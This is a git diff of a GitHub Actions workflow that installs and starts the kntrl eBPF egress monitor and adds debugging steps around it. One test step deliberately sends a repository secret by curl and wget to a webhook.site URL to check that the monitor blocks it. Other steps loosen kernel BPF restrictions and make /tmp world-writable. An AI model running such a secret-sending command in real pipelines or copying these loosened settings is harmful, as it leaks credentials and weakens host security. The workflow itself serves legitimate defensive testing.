@@ -17,52 +17,70 @@ jobs:
           echo "Current directory: $(pwd)"
           echo "Temp directory: /tmp"
           ls -la /tmp
-          
+
       - name: Install dependencies
         run: |
           sudo apt-get update
           sudo apt-get install -y wget curl
-          - name: Setup and Start kntrl
-          run: |
-            echo "Downloading kntrl..."
-            wget -q https://github.com/kondukto-io/kntrl/releases/download/v0.1.3/kntrl 
-            chmod +x kntrl
-            
-            # Increase MEMLOCK limits before starting kntrl
-            echo "Setting MEMLOCK limits..."
-            sudo sysctl -w kernel.unprivileged_bpf_disabled=0
-            sudo ulimit -l unlimited || echo "Unable to set unlimited memlock, continuing anyway"
-            
-            echo "Starting kntrl with explicit output file..."
-            sudo ./kntrl start --mode=trace \
-              --allowed-hosts=download.kondukto.io,github.com \
-              --allow-github-meta=true \
-              --output-file-name=/tmp/kntrl_report.out \
-              --verbose &
-              
-            echo "Waiting for kntrl to initialize..."
-            sleep 10  # Increased sleep time to give kntrl more time to initialize
-            
-            # Verify kntrl is running
-            echo "Checking if kntrl is running..."
-            ps aux | grep kntrl
-            
-            # Check if output directory is writable
-            echo "Checking if /tmp is writable..."
-            touch /tmp/test_write && echo "Yes, /tmp is writable" || echo "No, /tmp is not writable"
-            
-            # Verify kernel settings
-            echo "Checking kernel settings..."
-            sudo sysctl kernel.unprivileged_bpf_disabled || echo "Cannot check kernel.unprivileged_bpf_disabled"
-            
-            # Check memlock limits
-            echo "Current memlock limits:"
-            ulimit -l
+
+      - name: Setup and Start kntrl
+        run: |
+          echo "Downloading kntrl..."
+          wget -q https://github.com/kondukto-io/kntrl/releases/download/v0.1.3/kntrl 
+          chmod +x kntrl
+          
+          # Set kernel parameters for eBPF
+          echo "Setting kernel parameters for eBPF..."
+          sudo sysctl -w kernel.unprivileged_bpf_disabled=0 || echo "Cannot set kernel.unprivileged_bpf_disabled"
+          
+          # Configure memory lock limits
+          echo "Setting memory lock limits..."
+          sudo bash -c "echo '* soft memlock unlimited' >> /etc/security/limits.conf"
+          sudo bash -c "echo '* hard memlock unlimited' >> /etc/security/limits.conf"
+          sudo bash -c "ulimit -l unlimited" || echo "Unable to set unlimited memlock via sudo"
+          
+          # Verify the system capabilities
+          echo "System capabilities:"
+          sudo capsh --print || echo "Cannot check capabilities"
+          
+          # Start kntrl with enhanced logging
+          echo "Starting kntrl with explicit output file..."
+          sudo ./kntrl start --mode=trace \
+            --allowed-hosts=download.kondukto.io,github.com \
+            --allow-github-meta=true \
+            --output-file-name=/tmp/kntrl_report.out \
+            --verbose &
+          
+          echo "Waiting for kntrl to initialize..."
+          sleep 15  # Increased sleep time to give kntrl more time to initialize
+          
+          # Verify kntrl is running
+          echo "Checking if kntrl is running..."
+          ps aux | grep -v grep | grep kntrl || echo "kntrl process not found"
+          
+          # Check if output directory is writable
+          echo "Checking if /tmp is writable..."
+          touch /tmp/test_write && echo "Yes, /tmp is writable" || echo "No, /tmp is not writable"
+          sudo chmod 777 /tmp || echo "Could not change /tmp permissions"
+          
+          # Verify kernel settings
+          echo "Checking kernel settings..."
+          sudo sysctl kernel.unprivileged_bpf_disabled || echo "Cannot check kernel.unprivileged_bpf_disabled"
+          
+          # Check memlock limits
+          echo "Current memlock limits:"
+          ulimit -l || echo "Cannot check memlock limits"
+          sudo bash -c "ulimit -l" || echo "Cannot check sudo memlock limits"
+          
+          # Ensure kntrl output file is accessible
+          sudo touch /tmp/kntrl_report.out || echo "Cannot create kntrl_report.out"
+          sudo chmod 666 /tmp/kntrl_report.out || echo "Cannot set permissions on kntrl_report.out"
+
       - name: Test allowed request
         run: |
           echo "Testing allowed request to download.kondukto.io..."
           curl -v https://download.kondukto.io 2>&1 | grep "HTTP/"
-      
+
       - name: Test disallowed request with secret
         env:
           SECRET: ${{ secrets.MY_SECRET }}
@@ -70,20 +88,26 @@ jobs:
           echo "Testing disallowed request with secret..."
           curl --connect-timeout 5 https://webhook.site/2c215e92-a7db-465c-b061-866f7cf1a9ca?secret=$SECRET&id=$GITHUB_RUN_ID || echo "Request blocked as expected"
           wget --connect-timeout=3 https://webhook.site/2c215e92-a7db-465c-b061-866f7cf1a9ca?secret=$SECRET&id=$GITHUB_RUN_ID || echo "Request blocked as expected"
+
       - name: Look for kntrl report files
         run: |
           echo "Searching for kntrl report files..."
-          sudo find / -name "kntrl*.out" -o -name "*.out" | grep -i kntrl || echo "No kntrl report files found"
+          sudo find / -name "kntrl*.out" 2>/dev/null || echo "No kntrl report files found with find command"
           
           # Check common locations
           ls -la /tmp/kntrl*.out 2>/dev/null || echo "No kntrl*.out files in /tmp"
           ls -la /var/log/kntrl* 2>/dev/null || echo "No kntrl files in /var/log"
           ls -la ./kntrl*.out 2>/dev/null || echo "No kntrl*.out files in current directory"
+          
+          # Create directory listing to help troubleshoot
+          echo "Contents of /tmp:"
+          ls -la /tmp
+
       - name: Print kntrl report
         run: |
           echo "Printing kntrl report..."
           echo "---------------------"
-          cat /tmp/kntrl_report.out 2>/dev/null || echo "Report file not found at /tmp/kntrl_report.out"
+          sudo cat /tmp/kntrl_report.out 2>/dev/null || echo "Report file not found at /tmp/kntrl_report.out"
           echo "---------------------"
           
           # Try to find and print any kntrl report
@@ -93,11 +117,15 @@ jobs:
             echo "$REPORT_FILES"
             for file in $REPORT_FILES; do
               echo "Contents of $file:"
-              cat "$file"
+              sudo cat "$file" || echo "Could not read $file"
             done
           else
             echo "No kntrl report files found anywhere"
           fi
+          
+          # Check for any other related output
+          sudo dmesg | grep -i bpf || echo "No BPF messages in kernel log"
+
       - name: Stop kntrl
         run: |
           echo "Stopping kntrl..."
@@ -105,3 +133,6 @@ jobs:
           
           # Kill any remaining kntrl processes
           sudo pkill -f kntrl || echo "No kntrl processes to kill"
+          
+          # Final check to ensure cleanup
+          ps aux | grep -v grep | grep kntrl && echo "WARNING: kntrl processes still running" || echo "All kntrl processes stopped"
